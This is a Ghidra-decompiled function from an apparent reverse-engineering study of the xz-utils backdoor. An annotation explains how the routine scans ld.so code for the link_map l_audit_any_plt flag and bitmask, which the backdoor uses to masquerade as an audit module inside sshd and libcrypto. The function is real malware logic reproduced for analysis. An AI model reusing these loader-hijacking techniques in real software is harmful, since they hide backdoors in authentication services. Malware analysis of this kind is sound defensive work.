// /home/kali/xzre-ghidra/xzregh/104AE0_find_link_map_l_audit_any_plt_bitmask.c
// Function: find_link_map_l_audit_any_plt_bitmask @ 0x104AE0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_link_map_l_audit_any_plt_bitmask(backdoor_data_handle_t * data, instruction_search_ctx_t * search_ctx)
/*
 * AutoDoc: Disassembles `_dl_audit_symbind_alt` to recover the load/test sequence for `link_map::l_audit_any_plt`, yielding both the flag address and the bitmask ld.so uses. The loader stores those values so it can flip the flag for sshd and libcrypto when masquerading as an audit module.
 */

#include "xzre_types.h"


BOOL find_link_map_l_audit_any_plt_bitmask
               (backdoor_data_handle_t *data,instruction_search_ctx_t *search_ctx)

{
  imported_funcs_t *piVar1;
  libc_imports_t *plVar2;
  u32 *puVar3;
  backdoor_hooks_data_t *pbVar4;
  undefined1 uVar5;
  BOOL BVar6;
  u32 uVar7;
  lzma_allocator *allocator;
  _func_47 *p_Var8;
  lzma_allocator *allocator_00;
  _func_18 *p_Var9;
  link_map *plVar10;
  undefined1 uVar11;
  byte bVar12;
  long lVar13;
  u8 *puVar14;
  u8 **ppuVar15;
  int iVar16;
  u8 *code_start;
  byte bVar17;
  u8 *local_80;
  u64 local_78;
  _union_75 local_70;
  byte local_60;
  uint local_58;
  u8 *local_50;
  ulong local_40;
  
  bVar17 = 0;
  BVar6 = secret_data_append_from_address((void *)0x0,(secret_data_shift_cursor_t)0x97,0x1f,9);
  if (BVar6 != 0) {
    code_start = search_ctx->start_addr;
    ppuVar15 = &local_80;
    for (lVar13 = 0x16; lVar13 != 0; lVar13 = lVar13 + -1) {
      *(undefined4 *)ppuVar15 = 0;
      ppuVar15 = (u8 **)((long)ppuVar15 + (ulong)bVar17 * -8 + 4);
    }
    allocator = get_lzma_allocator();
    allocator->opaque = data->elf_handles->libcrypto;
    p_Var8 = (_func_47 *)lzma_alloc(0xc08,allocator);
    piVar1 = search_ctx->imported_funcs;
    piVar1->EVP_DecryptInit_ex = p_Var8;
    if (p_Var8 != (_func_47 *)0x0) {
      piVar1->resolved_imports_count = piVar1->resolved_imports_count + 1;
    }
    plVar2 = piVar1->libc;
    allocator_00 = get_lzma_allocator();
    allocator_00->opaque = data->elf_handles->libc;
    p_Var9 = (_func_18 *)lzma_alloc(0x348,allocator_00);
    plVar2->getuid = p_Var9;
    if (p_Var9 != (_func_18 *)0x0) {
      plVar2->resolved_imports_count = plVar2->resolved_imports_count + 1;
    }
    iVar16 = 0;
    bVar17 = 0xff;
    for (; code_start < search_ctx->end_addr; code_start = code_start + local_78) {
      BVar6 = x86_dasm((dasm_ctx_t *)&local_80,code_start,search_ctx->end_addr);
      if (BVar6 == 0) {
        return 0;
      }
      if (iVar16 == 0) {
        if (((local_58 == 0x1036) && (((ushort)local_70._0_4_ & 0x140) == 0x140)) &&
           ((byte)(local_70._13_1_ - 1) < 2)) {
          uVar11 = 0;
          if ((local_70._0_4_ & 0x40) == 0) {
            uVar5 = 0;
            if (((local_70._0_4_ & 0x1040) != 0) &&
               (uVar5 = local_70.field0.flags2 & 0x10, (local_70._0_4_ & 0x1000) != 0)) {
              if ((local_70._0_4_ & 0x20) == 0) {
                uVar11 = 0;
                uVar5 = local_60;
              }
              else {
                uVar5 = local_60 | ((byte)local_70.field0.field10_0xb & 1) << 3;
              }
            }
          }
          else {
            uVar5 = local_70.field0.flags & 0x20;
            if ((local_70._0_4_ & 0x20) == 0) {
              uVar11 = local_70._15_1_;
              if ((local_70._0_4_ & 0x1040) != 0) {
                uVar5 = local_70._14_1_;
              }
            }
            else {
              uVar11 = local_70._15_1_ | (char)local_70.field0.field10_0xb * '\b' & 8U;
              uVar5 = 0;
              if ((local_70._0_4_ & 0x1040) != 0) {
                uVar5 = local_70._14_1_ | (char)local_70.field0.field10_0xb * '\x02' & 8U;
              }
            }
          }
          puVar14 = (u8 *)0x0;
          if (((local_70._0_4_ & 0x100) != 0) &&
             (puVar14 = local_50, ((uint)local_70.field0.field11_0xc & 0xff00ff00) == 0x5000000)) {
            puVar14 = local_80 + (long)(local_50 + local_78);
          }
          if (((u8 *)(ulong)*(uint *)&search_ctx->offset_to_match == puVar14) &&
             (((int)(uint)*(ushort *)search_ctx->output_register >> (uVar11 & 0x1f) & 1U) != 0)) {
            *(undefined1 *)((long)search_ctx->output_register + 2) = uVar5;
            iVar16 = 1;
          }
        }
      }
      else if (iVar16 == 1) {
        if ((local_58 & 0xfffffffd) == 0x89) {
          puVar3 = search_ctx->output_register_to_match;
          uVar11 = local_70.field0.flags & 0x40;
          if ((local_70._0_4_ & 0x1040) == 0) {
            uVar5 = 0;
            if ((local_70._0_4_ & 0x40) != 0) goto LAB_00104d83;
            if (*(char *)((long)puVar3 + 2) != '\0') goto LAB_00104e97;
            bVar12 = 0;
LAB_00104da0:
            if (search_ctx->output_register[2] != uVar11) goto LAB_00104da9;
          }
          else {
            if ((local_70._0_4_ & 0x40) == 0) {
              if ((local_70._0_4_ & 0x1000) == 0) {
                if (*(char *)((long)puVar3 + 2) == '\0') {
                  uVar5 = 0;
                  bVar12 = 0;
                  goto LAB_00104da0;
                }
                goto LAB_00104e97;
              }
              uVar5 = local_60;
              if ((local_70._0_4_ & 0x20) != 0) {
                uVar5 = local_60 | ((byte)local_70.field0.field10_0xb & 1) << 3;
              }
            }
            else {
              uVar5 = local_70._14_1_;
              if ((local_70._0_4_ & 0x20) != 0) {
                uVar5 = local_70._14_1_ | (char)local_70.field0.field10_0xb * '\x02' & 8U;
              }
LAB_00104d83:
              uVar11 = local_70._15_1_;
              if ((local_70._0_4_ & 0x20) != 0) {
                uVar11 = local_70._15_1_ | ((byte)local_70.field0.field10_0xb & 1) << 3;
              }
            }
            bVar12 = *(byte *)((long)puVar3 + 2);
            if (bVar12 == uVar5) goto LAB_00104da0;
LAB_00104da9:
            if ((uVar11 != bVar12) || (search_ctx->output_register[2] != uVar5)) goto LAB_00104e97;
          }
          iVar16 = 2;
          bVar17 = uVar11;
          if (local_58 != 0x89) {
            bVar17 = uVar5;
          }
        }
      }
      else if (iVar16 == 2) {
        if (local_58 == 0x128) {
          bVar12 = 0;
        }
        else {
          if ((local_58 != 0x176) || (local_70._14_1_ != 0)) goto LAB_00104e97;
          bVar12 = 0;
          if ((local_70._0_4_ & 0x1040) != 0) {
            if ((local_70._0_4_ & 0x40) == 0) {
              bVar12 = local_70.field0.flags2 & 0x10;
              if (((local_70._0_4_ & 0x1000) != 0) &&
                 (bVar12 = local_60, (local_70._0_4_ & 0x20) != 0)) {
                bVar12 = local_60 | ((byte)local_70.field0.field10_0xb & 1) << 3;
              }
            }
            else {
              bVar12 = local_70.field0.flags & 0x20;
              if ((local_70._0_4_ & 0x20) != 0) {
                bVar12 = (char)local_70.field0.field10_0xb * '\x02' & 8;
              }
            }
          }
        }
        if (bVar17 == bVar12) {
          if ((local_40 < 0x100) && (uVar7 = count_bits(local_40), uVar7 == 1)) {
            pbVar4 = search_ctx->hooks;
            plVar10 = data->data->main_map + *(uint *)&search_ctx->offset_to_match;
            (pbVar4->ldso_ctx).sshd_link_map_l_audit_any_plt_addr = plVar10;
            (pbVar4->ldso_ctx).link_map_l_audit_any_plt_bitmask = (u8)local_40;
            if (((byte)*plVar10 & local_40) == 0) {
              return 1;
            }
          }
          search_ctx->result = 1;
          return 0;
        }
      }
LAB_00104e97:
    }
    allocator->opaque = data->elf_handles->libcrypto;
    lzma_free(search_ctx->imported_funcs->EVP_DecryptInit_ex,allocator);
    lzma_free(plVar2->getuid,allocator_00);
  }
  return 0;
}

